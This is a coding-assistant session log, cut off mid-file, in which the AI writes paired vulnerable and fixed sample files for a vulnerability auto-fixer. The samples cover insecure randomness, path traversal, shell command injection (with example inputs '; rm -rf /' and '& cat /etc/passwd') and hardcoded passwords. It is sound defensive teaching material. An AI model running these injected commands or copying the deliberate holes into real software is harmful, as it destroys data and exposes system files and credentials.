          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_insecure_random.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating insecure randomness vulnerability and fix\\n\\"\\"\\"\\n\\nimport random\\nimport secrets\\nimport hashlib\\nimport os\\n\\n# VULNERABLE: Using pseudo-random for security-sensitive operations\\ndef generate_token_unsafe():\\n    # UNSAFE: random() uses Mersenne Twister PRNG - predictable\\n    token = random.randint(1000000, 9999999)\\n    return str(token)\\n\\n\\ndef generate_session_id_unsafe():\\n    # UNSAFE: random.random() is predictable, not cryptographically secure\\n    session_id = str(random.random())\\n    return hashlib.md5(session_id.encode()).hexdigest()\\n\\n\\n# SAFE: Using cryptographically secure random\\ndef generate_token_safe():\\n    # SAFE: secrets module uses os.urandom() - cryptographically secure\\n    token = secrets.randbelow(9000000) + 1000000\\n    return str(token)\\n\\n\\ndef generate_session_id_safe():\\n    # SAFE: secrets.token_hex() uses cryptographically secure random\\n    session_id = secrets.token_hex(16)\\n    return session_id\\n\\n\\ndef generate_password_safe(length=16):\\n    # SAFE: secrets.choice() uses secure random generator\\n    alphabet = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*\\"\\n    password = \\"\\".join(secrets.choice(alphabet) for _ in range(length))\\n    return password\\n\\n\\n# VULNERABLE: Weak seed initialization\\ndef generate_secret_unsafe():\\n    # UNSAFE: Seeding with time is predictable\\n    random.seed(os.getpid())  # Process ID can be guessed\\n    return random.randint(1000, 9999)\\n\\n\\n# SAFE: Direct use of os.urandom for critical operations\\ndef generate_secret_safe():\\n    # SAFE: os.urandom() provides cryptographically secure random bytes\\n    random_bytes = os.urandom(4)\\n    return int.from_bytes(random_bytes, byteorder=\\"big\\")"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating insecure randomness vulnerability and fix\\n+ \\"\\"\\"\\n+ \\n+ import random\\n+ import secrets\\n+ import hashlib\\n+ import os\\n+ \\n+ # VULNERABLE: Using pseudo-random for security-sensitive operations\\n+ def generate_token_unsafe():\\n+     # UNSAFE: random() uses Mersenne Twister PRNG - predictable\\n+     token = random.randint(1000000, 9999999)\\n+     return str(token)\\n+ \\n+ \\n+ def generate_session_id_unsafe():\\n+     # UNSAFE: random.random() is predictable, not cryptographically secure\\n+     session_id = str(random.random())\\n+     return hashlib.md5(session_id.encode()).hexdigest()\\n+ \\n+ \\n+ # SAFE: Using cryptographically secure random\\n+ def generate_token_safe():\\n+     # SAFE: secrets module uses os.urandom() - cryptographically secure\\n+     token = secrets.randbelow(9000000) + 1000000\\n+     return str(token)\\n+ \\n+ \\n+ def generate_session_id_safe():\\n+     # SAFE: secrets.token_hex() uses cryptographically secure random\\n+     session_id = secrets.token_hex(16)\\n+     return session_id\\n+ \\n+ \\n+ def generate_password_safe(length=16):\\n+     # SAFE: secrets.choice() uses secure random generator\\n+     alphabet = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*\\"\\n+     password = \\"\\".join(secrets.choice(alphabet) for _ in range(length))\\n+     return password\\n+ \\n+ \\n+ # VULNERABLE: Weak seed initialization\\n+ def generate_secret_unsafe():\\n+     # UNSAFE: Seeding with time is predictable\\n+     random.seed(os.getpid())  # Process ID can be guessed\\n+     return random.randint(1000, 9999)\\n+ \\n+ \\n+ # SAFE: Direct use of os.urandom for critical operations\\n+ def generate_secret_safe():\\n+     # SAFE: os.urandom() provides cryptographically secure random bytes\\n+     random_bytes = os.urandom(4)\\n+     return int.from_bytes(random_bytes, byteorder=\\"big\\")","oldStart":1,"newStart":1,"oldLines":1,"newLines":54,"linesRemoved":1,"linesAdded":54}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_insecure_random.py."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.231Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_path_traversal.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_path_traversal.go", "contents": "package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"io/ioutil\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n)\\n\\n// VULNERABLE: Path traversal vulnerability\\nfunc readFileUnsafe(filename string) ([]byte, error) {\\n\\t// UNSAFE: No validation, allows directory traversal (../../../etc/passwd)\\n\\tfilePath := filepath.Join(\\"uploads\\", filename)\\n\\treturn ioutil.ReadFile(filePath)\\n}\\n\\n// VULNERABLE: Direct concatenation without sanitization\\nfunc getFilePathUnsafe(userInput string) string {\\n\\t// UNSAFE: User input can contain .. or / to traverse directories\\n\\tbaseDir := \\"/var/www/uploads\\"\\n\\treturn baseDir + \\"/\\" + userInput // Dangerous!\\n}\\n\\n// SAFE: Using filepath.Base() and proper validation\\nfunc readFileSafe(filename string) ([]byte, error) {\\n\\t// SAFE: filepath.Base() removes directory components\\n\\tsafeFilename := filepath.Base(filename)\\n\\t\\n\\t// SAFE: Additional validation to prevent null bytes or absolute paths\\n\\tif strings.Contains(safeFilename, \\"..\\") || strings.Contains(safeFilename, \\"\\\\x00\\") {\\n\\t\\treturn nil, fmt.Errorf(\\"invalid filename\\")\\n\\t}\\n\\t\\n\\tfilePath := filepath.Join(\\"uploads\\", safeFilename)\\n\\t\\n\\t// SAFE: Resolve absolute path and verify it's within base directory\\n\\tabsPath, err := filepath.Abs(filePath)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n\\tif !strings.HasPrefix(absPath, baseDir) {\\n\\t\\treturn nil, fmt.Errorf(\\"path traversal detected\\")\\n\\t}\\n\\t\\n\\treturn ioutil.ReadFile(absPath)\\n}\\n\\n// SAFE: Using filepath.Clean() and absolute path verification\\nfunc getFilePathSafe(userInput string) (string, error) {\\n\\t// SAFE: Clean the path first\\n\\tcleaned := filepath.Clean(userInput)\\n\\t\\n\\t// SAFE: Remove any directory traversal attempts\\n\\tif strings.Contains(cleaned, \\"..\\") {\\n\\t\\treturn \\"\\", fmt.Errorf(\\"path traversal not allowed\\")\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"/var/www/uploads\\")\\n\\tsafePath := filepath.Join(baseDir, cleaned)\\n\\t\\n\\t// SAFE: Verify the resolved path is still within base directory\\n\\tif !strings.HasPrefix(safePath, baseDir) {\\n\\t\\treturn \\"\\", fmt.Errorf(\\"invalid path\\")\\n\\t}\\n\\t\\n\\treturn safePath, nil\\n}\\n\\n// SAFE: Using a whitelist approach\\nfunc readFileSafeWhitelist(filename string) ([]byte, error) {\\n\\t// SAFE: Only allow alphanumeric, dash, underscore, and dot\\n\\tallowedChars := \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"\\n\\tfor _, char := range filename {\\n\\t\\tif !strings.ContainsRune(allowedChars, char) {\\n\\t\\t\\treturn nil, fmt.Errorf(\\"invalid character in filename\\")\\n\\t\\t}\\n\\t}\\n\\t\\n\\tfilePath := filepath.Join(\\"uploads\\", filename)\\n\\tabsPath, err := filepath.Abs(filePath)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n\\tif !strings.HasPrefix(absPath, baseDir) {\\n\\t\\treturn nil, fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\treturn ioutil.ReadFile(absPath)\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ package main\\n+ \\n+ import (\\n+ \\t\\"fmt\\"\\n+ \\t\\"io/ioutil\\"\\n+ \\t\\"os\\"\\n+ \\t\\"path/filepath\\"\\n+ \\t\\"strings\\"\\n+ )\\n+ \\n+ // VULNERABLE: Path traversal vulnerability\\n+ func readFileUnsafe(filename string) ([]byte, error) {\\n+ \\t// UNSAFE: No validation, allows directory traversal (../../../etc/passwd)\\n+ \\tfilePath := filepath.Join(\\"uploads\\", filename)\\n+ \\treturn ioutil.ReadFile(filePath)\\n+ }\\n+ \\n+ // VULNERABLE: Direct concatenation without sanitization\\n+ func getFilePathUnsafe(userInput string) string {\\n+ \\t// UNSAFE: User input can contain .. or / to traverse directories\\n+ \\tbaseDir := \\"/var/www/uploads\\"\\n+ \\treturn baseDir + \\"/\\" + userInput // Dangerous!\\n+ }\\n+ \\n+ // SAFE: Using filepath.Base() and proper validation\\n+ func readFileSafe(filename string) ([]byte, error) {\\n+ \\t// SAFE: filepath.Base() removes directory components\\n+ \\tsafeFilename := filepath.Base(filename)\\n+ \\t\\n+ \\t// SAFE: Additional validation to prevent null bytes or absolute paths\\n+ \\tif strings.Contains(safeFilename, \\"..\\") || strings.Contains(safeFilename, \\"\\\\x00\\") {\\n+ \\t\\treturn nil, fmt.Errorf(\\"invalid filename\\")\\n+ \\t}\\n+ \\t\\n+ \\tfilePath := filepath.Join(\\"uploads\\", safeFilename)\\n+ \\t\\n+ \\t// SAFE: Resolve absolute path and verify it's within base directory\\n+ \\tabsPath, err := filepath.Abs(filePath)\\n+ \\tif err != nil {\\n+ \\t\\treturn nil, err\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n+ \\tif !strings.HasPrefix(absPath, baseDir) {\\n+ \\t\\treturn nil, fmt.Errorf(\\"path traversal detected\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn ioutil.ReadFile(absPath)\\n+ }\\n+ \\n+ // SAFE: Using filepath.Clean() and absolute path verification\\n+ func getFilePathSafe(userInput string) (string, error) {\\n+ \\t// SAFE: Clean the path first\\n+ \\tcleaned := filepath.Clean(userInput)\\n+ \\t\\n+ \\t// SAFE: Remove any directory traversal attempts\\n+ \\tif strings.Contains(cleaned, \\"..\\") {\\n+ \\t\\treturn \\"\\", fmt.Errorf(\\"path traversal not allowed\\")\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"/var/www/uploads\\")\\n+ \\tsafePath := filepath.Join(baseDir, cleaned)\\n+ \\t\\n+ \\t// SAFE: Verify the resolved path is still within base directory\\n+ \\tif !strings.HasPrefix(safePath, baseDir) {\\n+ \\t\\treturn \\"\\", fmt.Errorf(\\"invalid path\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn safePath, nil\\n+ }\\n+ \\n+ // SAFE: Using a whitelist approach\\n+ func readFileSafeWhitelist(filename string) ([]byte, error) {\\n+ \\t// SAFE: Only allow alphanumeric, dash, underscore, and dot\\n+ \\tallowedChars := \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"\\n+ \\tfor _, char := range filename {\\n+ \\t\\tif !strings.ContainsRune(allowedChars, char) {\\n+ \\t\\t\\treturn nil, fmt.Errorf(\\"invalid character in filename\\")\\n+ \\t\\t}\\n+ \\t}\\n+ \\t\\n+ \\tfilePath := filepath.Join(\\"uploads\\", filename)\\n+ \\tabsPath, err := filepath.Abs(filePath)\\n+ \\tif err != nil {\\n+ \\t\\treturn nil, err\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n+ \\tif !strings.HasPrefix(absPath, baseDir) {\\n+ \\t\\treturn nil, fmt.Errorf(\\"path outside allowed directory\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn ioutil.ReadFile(absPath)\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":94,"linesRemoved":1,"linesAdded":94}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_path_traversal.go."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:29.667Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_insecure_random.py","sample_path_traversal.go"]}",
          "rawArguments": "{"paths": ["sample_insecure_random.py","sample_path_traversal.go"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:36.795Z,
        "text": "Added 2 more sample code files:

1. **\`sample_insecure_random.py\`** — Insecure randomness in Python, including:
   - Unsafe use of \`random\` module for security-sensitive operations
   - Safe use of \`secrets\` module for cryptographic operations
   - Proper secure random generation for tokens, passwords, and session IDs

2. **\`sample_path_traversal.go\`** — Path traversal (directory traversal) in Go, including:
   - Unsafe file access without validation
   - Safe path validation using \`filepath.Base()\`, \`filepath.Clean()\`, and absolute path verification
   - Whitelist approach for filename validation

You now have 6 sample files in the repo root covering SQL injection, XSS, insecure randomness, and path traversal across multiple languages (SQL, Java, Python, JavaScript, Go).",
        "tokens": {
          "inputCount": 41912,
          "outputCount": 1713,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:17.398Z,
        "text": "let's write 2 sample code files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:22.989Z,
        "text": "Creating 2 sample code files in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:23.115Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_command_injection.sh"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_command_injection.sh", "contents": "#!/bin/bash\\n\\n# Sample code demonstrating command injection vulnerabilities and fixes\\n\\n# VULNERABLE: Direct command execution with user input\\nprocess_user_input_unsafe() {\\n    local user_input=\\"$1\\"\\n    # UNSAFE: User input directly executed - allows command injection\\n    # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n    echo \\"Processing: $user_input\\"\\n    eval \\"ls -la $user_input\\"  # Dangerous!\\n}\\n\\n# VULNERABLE: Using backticks or $() without sanitization\\nget_file_info_unsafe() {\\n    local filename=\\"$1\\"\\n    # UNSAFE: Backticks execute commands in user input\\n    result=\`ls -l $filename\`  # Dangerous!\\n    echo \\"$result\\"\\n}\\n\\n# SAFE: Properly quoting and validating input\\nprocess_user_input_safe() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Quote variable to prevent word splitting and pathname expansion\\n    if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        echo \\"Error: Invalid characters in input\\"\\n        return 1\\n    fi\\n    # SAFE: Use printf or properly quoted variables\\n    printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n    ls -la -- \\"$user_input\\"  # -- prevents option injection\\n}\\n\\n# SAFE: Using arrays for arguments\\nexecute_command_safe() {\\n    local filename=\\"$1\\"\\n    # SAFE: Validate input format\\n    if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n        echo \\"Error: Invalid filename\\"\\n        return 1\\n    fi\\n    # SAFE: Use array to separate arguments\\n    local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n    \\"\${cmd[@]}\\"\\n}\\n\\n# SAFE: Restricted pattern matching\\nvalidate_and_process() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Whitelist approach - only allow specific characters\\n    if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        filepath=\\"/safe/directory/$user_input\\"\\n        [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n    else\\n        echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n    fi\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ #!/bin/bash\\n+ \\n+ # Sample code demonstrating command injection vulnerabilities and fixes\\n+ \\n+ # VULNERABLE: Direct command execution with user input\\n+ process_user_input_unsafe() {\\n+     local user_input=\\"$1\\"\\n+     # UNSAFE: User input directly executed - allows command injection\\n+     # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n+     echo \\"Processing: $user_input\\"\\n+     eval \\"ls -la $user_input\\"  # Dangerous!\\n+ }\\n+ \\n+ # VULNERABLE: Using backticks or $() without sanitization\\n+ get_file_info_unsafe() {\\n+     local filename=\\"$1\\"\\n+     # UNSAFE: Backticks execute commands in user input\\n+     result=\`ls -l $filename\`  # Dangerous!\\n+     echo \\"$result\\"\\n+ }\\n+ \\n+ # SAFE: Properly quoting and validating input\\n+ process_user_input_safe() {\\n+     local user_input=\\"$1\\"\\n+     # SAFE: Quote variable to prevent word splitting and pathname expansion\\n+     if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n+         echo \\"Error: Invalid characters in input\\"\\n+         return 1\\n+     fi\\n+     # SAFE: Use printf or properly quoted variables\\n+     printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n+     ls -la -- \\"$user_input\\"  # -- prevents option injection\\n+ }\\n+ \\n+ # SAFE: Using arrays for arguments\\n+ execute_command_safe() {\\n+     local filename=\\"$1\\"\\n+     # SAFE: Validate input format\\n+     if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n+         echo \\"Error: Invalid filename\\"\\n+         return 1\\n+     fi\\n+     # SAFE: Use array to separate arguments\\n+     local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n+     \\"\${cmd[@]}\\"\\n+ }\\n+ \\n+ # SAFE: Restricted pattern matching\\n+ validate_and_process() {\\n+     local user_input=\\"$1\\"\\n+     # SAFE: Whitelist approach - only allow specific characters\\n+     if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n+         filepath=\\"/safe/directory/$user_input\\"\\n+         [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n+     else\\n+         echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n+     fi\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":58,"linesRemoved":1,"linesAdded":58}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_command_injection.sh.","contentsAfterEdit":"#!/bin/bash\\n\\n# Sample code demonstrating command injection vulnerabilities and fixes\\n\\n# VULNERABLE: Direct command execution with user input\\nprocess_user_input_unsafe() {\\n    local user_input=\\"$1\\"\\n    # UNSAFE: User input directly executed - allows command injection\\n    # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n    echo \\"Processing: $user_input\\"\\n    eval \\"ls -la $user_input\\"  # Dangerous!\\n}\\n\\n# VULNERABLE: Using backticks or $() without sanitization\\nget_file_info_unsafe() {\\n    local filename=\\"$1\\"\\n    # UNSAFE: Backticks execute commands in user input\\n    result=\`ls -l $filename\`  # Dangerous!\\n    echo \\"$result\\"\\n}\\n\\n# SAFE: Properly quoting and validating input\\nprocess_user_input_safe() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Quote variable to prevent word splitting and pathname expansion\\n    if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        echo \\"Error: Invalid characters in input\\"\\n        return 1\\n    fi\\n    # SAFE: Use printf or properly quoted variables\\n    printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n    ls -la -- \\"$user_input\\"  # -- prevents option injection\\n}\\n\\n# SAFE: Using arrays for arguments\\nexecute_command_safe() {\\n    local filename=\\"$1\\"\\n    # SAFE: Validate input format\\n    if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n        echo \\"Error: Invalid filename\\"\\n        return 1\\n    fi\\n    # SAFE: Use array to separate arguments\\n    local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n    \\"\${cmd[@]}\\"\\n}\\n\\n# SAFE: Restricted pattern matching\\nvalidate_and_process() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Whitelist approach - only allow specific characters\\n    if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        filepath=\\"/safe/directory/$user_input\\"\\n        [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n    else\\n        echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n    fi\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:23.115Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java", "contents": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n */\\n\\npublic class HardcodedSecretsExample {\\n\\n    // VULNERABLE: Hardcoded credentials\\n    public Connection connectUnsafe() throws SQLException {\\n        // UNSAFE: Hardcoded username and password in source code\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = \\"admin\\";\\n        String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // VULNERABLE: Base64 encoded (not encrypted!)\\n    public Connection connectUnsafeBase64() throws SQLException {\\n        // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n        String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n        String password = new String(java.util.Base64.getDecoder().decode(encodedPassword));\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        return DriverManager.getConnection(url, \\"admin\\", password);\\n    }\\n\\n    // VULNERABLE: Commented out code with secrets\\n    public Connection connectUnsafeCommented() throws SQLException {\\n        // String password = \\"tempPassword123\\"; // Still visible in source!\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using environment variables\\n    public Connection connectSafe() throws SQLException {\\n        // SAFE: Credentials from environment variables (not in source code)\\n        String url = System.getenv(\\"DB_URL\\");\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\");\\n        \\n        if (url == null || username == null || password == null) {\\n            throw new IllegalStateException(\\"Database credentials not configured\\");\\n        }\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using configuration files (outside source code)\\n    public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n        // SAFE: Load from external configuration file (gitignored)\\n        String url = config.getProperty(\\"db.url\\");\\n        String username = config.getProperty(\\"db.username\\");\\n        String password = config.getProperty(\\"db.password\\");\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using secret management service\\n    public Connection connectSafeFromSecretManager() throws SQLException {\\n        // SAFE: Retrieve from secure secret management service\\n        // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n        SecretManager secretManager = new SecretManager();\\n        DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n        \\n        return DriverManager.getConnection(\\n            creds.getUrl(),\\n            creds.getUsername(),\\n            creds.getPassword()\\n        );\\n    }\\n\\n    // Helper class (example)\\n    static class SecretManager {\\n        public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n            // Implementation would connect to secret management service\\n            // and retrieve credentials securely\\n            return new DatabaseCredentials();\\n        }\\n    }\\n\\n    static class DatabaseCredentials {\\n        public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n        public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n        public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ import java.sql.Connection;\\n+ import java.sql.DriverManager;\\n+ import java.sql.SQLException;\\n+ \\n+ /**\\n+  * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n+  */\\n+ \\n+ public class HardcodedSecretsExample {\\n+ \\n+     // VULNERABLE: Hardcoded credentials\\n+     public Connection connectUnsafe() throws SQLException {\\n+         // UNSAFE: Hardcoded username and password in source code\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         String username = \\"admin\\";\\n+         String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // VULNERABLE: Base64 encoded (not encrypted!)\\n+     public Connection connectUnsafeBase64() throws SQLException {\\n+         // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n+         String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n+         String password = new String(java.util.Base64.getDecoder().decode(encodedPassword));\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         return DriverManager.getConnection(url, \\"admin\\", password);\\n+     }\\n+ \\n+     // VULNERABLE: Commented out code with secrets\\n+     public Connection connectUnsafeCommented() throws SQLException {\\n+         // String password = \\"tempPassword123\\"; // Still visible in source!\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         String username = System.getenv(\\"DB_USER\\");\\n+         String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using environment variables\\n+     public Connection connectSafe() throws SQLException {\\n+         // SAFE: Credentials from environment variables (not in source code)\\n+         String url = System.getenv(\\"DB_URL\\");\\n+         String username = System.getenv(\\"DB_USER\\");\\n+         String password = System.getenv(\\"DB_PASS\\");\\n+         \\n+         if (url == null || username == null || password == null) {\\n+             throw new IllegalStateException(\\"Database credentials not configured\\");\\n+         }\\n+         \\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using configuration files (outside source code)\\n+     public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n+         // SAFE: Load from external configuration file (gitignored)\\n+         String url = config.getProperty(\\"db.url\\");\\n+         String username = config.getProperty(\\"db.username\\");\\n+         String password = config.getProperty(\\"db.password\\");\\n+         \\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using secret management service\\n+     public Connection connectSafeFromSecretManager() throws SQLException {\\n+         // SAFE: Retrieve from secure secret management service\\n+         // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n+         SecretManager secretManager = new SecretManager();\\n+         DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n+         \\n+         return DriverManager.getConnection(\\n+             creds.getUrl(),\\n+             creds.getUsername(),\\n+             creds.getPassword()\\n+         );\\n+     }\\n+ \\n+     // Helper class (example)\\n+     static class SecretManager {\\n+         public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n+             // Implementation would connect to secret management service\\n+             // and retrieve credentials securely\\n+             return new DatabaseCredentials();\\n+         }\\n+     }\\n+ \\n+     static class DatabaseCredentials {\\n+         public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n+         public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n+         public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":90,"linesRemoved":1,"linesAdded":90}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java.","contentsAfterEdit":"import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n */\\n\\npublic class HardcodedSecretsExample {\\n\\n    // VULNERABLE: Hardcoded credentials\\n    public Connection connectUnsafe() throws SQLException {\\n        // UNSAFE: Hardcoded username and password in source code\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = \\"admin\\";\\n        String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // VULNERABLE: Base64 encoded (not encrypted!)\\n    public Connection connectUnsafeBase64() throws SQLException {\\n        // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n        String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n        String password = new String(java.util.Base64.getDecoder().decode(encodedPassword));\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        return DriverManager.getConnection(url, \\"admin\\", password);\\n    }\\n\\n    // VULNERABLE: Commented out code with secrets\\n    public Connection connectUnsafeCommented() throws SQLException {\\n        // String password = \\"tempPassword123\\"; // Still 